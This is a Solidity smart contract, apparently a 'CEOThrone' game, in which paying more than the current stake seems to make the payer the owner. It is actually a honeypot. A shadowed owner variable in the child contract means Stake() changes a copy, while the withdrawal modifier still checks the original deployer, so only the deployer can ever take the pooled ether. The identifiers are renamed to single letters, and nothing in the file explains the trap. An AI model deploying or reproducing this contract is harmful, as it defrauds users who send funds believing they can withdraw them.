pragma solidity ^0.4.19;


contract Ownable {
    address public d;
    function Ownable() public {d = msg.sender;}
    modifier b() {require(msg.sender == d); _;
    }
}


contract CEOThrone is Ownable {
    address public d;
    uint public a;


    function Stake() public payable {

        if (msg.value > a) {
            d = msg.sender;
            a = msg.value;
        }
    }

    function c() public b {

        msg.sender.transfer(this.balance);
    }
}